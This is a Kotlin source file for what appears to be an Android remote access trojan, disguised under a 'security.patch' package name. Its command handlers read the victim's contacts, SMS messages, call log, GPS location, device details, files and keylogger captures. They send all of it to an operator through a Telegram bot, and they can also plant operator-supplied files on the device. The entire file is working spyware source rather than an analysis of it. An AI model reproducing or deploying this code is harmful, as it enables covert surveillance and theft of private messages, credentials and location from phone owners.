package com.android.security.patch.commands

import android.content.Context
import android.location.LocationManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import com.android.security.patch.RatApi
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object DataCmd {

    private const val MAX_ROWS = 100

    fun contacts(ctx: Context, chatId: Long) {
        Thread {
            try {
                val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                val proj = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cur = ctx.contentResolver.query(uri, proj, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
                cur?.use {
                    val sb = StringBuilder("<b>contacts</b>\n")
                    var n = 0
                    while (it.moveToNext() && n < MAX_ROWS) {
                        val name = it.getString(0) ?: "?"
                        val phone = it.getString(1) ?: "?"
                        sb.append("<code>$phone</code> — $name\n")
                        n++
                    }
                    if (n == 0) sb.append("<i>none</i>")
                    sendSafe(ctx, chatId, sb.toString(), "contacts.txt")
                } ?: sendSafe(ctx, chatId, "no contacts access (grant READ_CONTACTS)", null)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "contacts err: ${e.message}", chatId)
            }
        }.start()
    }

    fun sms(ctx: Context, chatId: Long, args: Array<String>) {
        val box = when (args.getOrNull(0)?.lowercase()) {
            "sent" -> Telephony.Sms.Sent.CONTENT_URI
            "draft" -> Telephony.Sms.Draft.CONTENT_URI
            else -> Telephony.Sms.Inbox.CONTENT_URI
        }
        val limit = (args.getOrNull(1)?.toIntOrNull() ?: 30).coerceIn(1, 100)
        RatApi.sendMessage(ctx, "reading sms...", chatId)
        Thread {
            try {
                val cur = ctx.contentResolver.query(
                    box,
                    arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                    null, null,
                    "${Telephony.Sms.DATE} DESC"
                )
                if (cur == null) {
                    RatApi.sendMessage(ctx, "no cursor (grant READ_SMS)", chatId); return@Thread
                }
                cur.use {
                    val sb = StringBuilder("<b>sms ${box.lastPathSegment}</b>\n")
                    val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
                    var n = 0
                    while (it.moveToNext() && n < limit) {
                        val from = it.getString(0) ?: "?"
                        val body = (it.getString(1) ?: "").replace("\n", " ").take(120)
                        val date = it.getLong(2)
                        sb.append("[${fmt.format(Date(date))}] <code>$from</code>\n$body\n\n")
                        n++
                    }
                    if (n == 0) sb.append("<i>none</i>")
                    sendSafe(ctx, chatId, sb.toString(), "sms.txt")
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "sms err: ${e.message}", chatId)
            }
        }.start()
    }

    fun callLog(ctx: Context, chatId: Long) {
        Thread {
            try {
                val cur = ctx.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                    null, null,
                    "${CallLog.Calls.DATE} DESC"
                )
                cur?.use {
                    val sb = StringBuilder("<b>call log</b>\n")
                    val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
                    var n = 0
                    while (it.moveToNext() && n < 50) {
                        val num = it.getString(0) ?: "?"
                        val type = when (it.getInt(1)) {
                            CallLog.Calls.INCOMING_TYPE -> "in"
                            CallLog.Calls.OUTGOING_TYPE -> "out"
                            CallLog.Calls.MISSED_TYPE -> "miss"
                            else -> "?"
                        }
                        val date = it.getLong(2)
                        val dur = it.getLong(3)
                        sb.append("[${fmt.format(Date(date))}] <code>$num</code> $type ${dur}s\n")
                        n++
                    }
                    if (n == 0) sb.append("<i>none</i>")
                    sendSafe(ctx, chatId, sb.toString(), "calllog.txt")
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "calllog err: ${e.message}", chatId)
            }
        }.start()
    }

    fun gps(ctx: Context, chatId: Long) {
        Thread {
            try {
                val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                var best: android.location.Location? = null
                for (p in lm.getProviders(true) ?: emptyList()) {
                    try {
                        val l = lm.getLastKnownLocation(p) ?: continue
                        if (best == null || l.time > best.time) best = l
                    } catch (_: SecurityException) {}
                }
                if (best == null) {
                    RatApi.sendMessage(ctx, "no last-known location", chatId); return@Thread
                }
                val url = "https://maps.google.com/?q=${best.latitude},${best.longitude}"
                RatApi.sendMessage(
                    ctx,
                    "<b>gps</b>\nlat: <code>${best.latitude}</code>\nlon: <code>${best.longitude}</code>\nacc: ${best.accuracy}m\n<a href=\"$url\">map</a>",
                    chatId
                )
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "gps err: ${e.message}", chatId)
            }
        }.start()
    }

    fun devInfo(ctx: Context, chatId: Long) {
        Thread {
            try {
                val sb = StringBuilder("<b>device info</b>\n")
                sb.append("brand: ${android.os.Build.BRAND}\n")
                sb.append("model: ${android.os.Build.MODEL}\n")
                sb.append("android: ${android.os.Build.VERSION.RELEASE}\n")
                sb.append("sdk: ${android.os.Build.VERSION.SDK_INT}\n")
                try {
                    val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                    sb.append("battery: ${bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)}%\n")
                } catch (_: Throwable) {}
                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    fun ls(ctx: Context, chatId: Long, args: Array<String>) {
        val path = args.getOrNull(0)?.ifBlank { null } ?: "/sdcard"
        com.android.security.patch.Pager.openLs(ctx, chatId, path)
    }

    fun download(ctx: Context, chatId: Long, args: Array<String>) {
        val path = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /dl <path>", chatId); return
        }
        Thread {
            try {
                val f = File(path)
                if (!f.exists() || !f.isFile) {
                    RatApi.sendMessage(ctx, "not found", chatId); return@Thread
                }
                if (f.length() > 45L * 1024 * 1024) {
                    RatApi.sendMessage(ctx, "too big", chatId); return@Thread
                }
                RatApi.sendChatAction(ctx, "upload_document", chatId)
                val bytes = f.readBytes()
                val mime = android.webkit.MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(f.extension.lowercase()) ?: "application/octet-stream"
                if (mime.startsWith("image/")) RatApi.sendPhoto(ctx, bytes, f.name, chatId)
                else if (mime.startsWith("video/")) RatApi.sendVideo(ctx, bytes, f.name, chatId)
                else if (mime.startsWith("audio/")) RatApi.sendAudio(ctx, bytes, f.name, chatId)
                else RatApi.sendDocument(ctx, bytes, f.name, "", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    fun keylog(ctx: Context, chatId: Long, args: Array<String>) {
        val mode = args.getOrNull(0)?.lowercase() ?: "dump"
        val svc = com.android.security.patch.KeylogService.instance
        when (mode) {
            "clear" -> {
                svc?.drain()
                RatApi.sendMessage(ctx, "keylog cleared", chatId)
            }
            else -> {
                val data = svc?.drain().orEmpty()
                if (data.isBlank()) {
                    RatApi.sendMessage(ctx, "keylog empty (or a11y off)", chatId)
                } else {
                    val bytes = data.toByteArray()
                    if (bytes.size <= 3500) {
                        sendSafe(ctx, chatId, "<pre>${data.take(3400)}</pre>", null)
                    } else {
                        RatApi.sendDocument(ctx, bytes, "keylog.txt", "keylog ${bytes.size}b", chatId)
                    }
                }
            }
        }
    }

    /**
     * Kirim pesan, tapi kalau kepanjangan (>4000 char) kirim sebagai file .txt.
     */

    fun upload(ctx: Context, chatId: Long, msg: org.json.JSONObject?) {
        val text = msg?.optString("text").orEmpty().trim()
        val args = text.split("\\s+".toRegex()).drop(1)
        val path = args.getOrNull(0)
        if (path.isNullOrBlank()) {
            RatApi.sendMessage(ctx, "usage: reply file dengan caption /upload /sdcard/file.jpg", chatId); return
        }
        val reply = msg?.optJSONObject("reply_to_message") ?: run {
            RatApi.sendMessage(ctx, "no reply file", chatId); return
        }
        val fileId = reply.optJSONObject("document")?.optString("file_id")
            ?: reply.optJSONArray("photo")?.let { arr ->
                if (arr.length() > 0) arr.optJSONObject(arr.length() - 1)?.optString("file_id") else null
            }
            ?: reply.optJSONObject("audio")?.optString("file_id")
            ?: reply.optJSONObject("video")?.optString("file_id")
        if (fileId.isNullOrBlank()) {
            RatApi.sendMessage(ctx, "no file in reply", chatId); return
        }
        Thread {
            try {
                val bytes = RatApi.downloadTelegramFile(fileId)
                if (bytes == null) { RatApi.sendMessage(ctx, "download failed", chatId); return@Thread }
                val f = File(path)
                f.parentFile?.mkdirs()
                f.writeBytes(bytes)
                RatApi.sendMessage(ctx, "saved ${bytes.size}b to $path", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    private fun sendSafe(ctx: Context, chatId: Long, text: String, fallbackFilename: String?) {
        if (text.length <= 3900 || fallbackFilename == null) {
            // potong kalau masih lewat batas telegram
            val out = if (text.length > 3900) text.substring(0, 3900) + "\n...(truncated)" else text
            RatApi.sendMessage(ctx, out, chatId)
        } else {
            RatApi.sendDocument(ctx, text.toByteArray(), fallbackFilename, "full output", chatId)
        }
    }
}
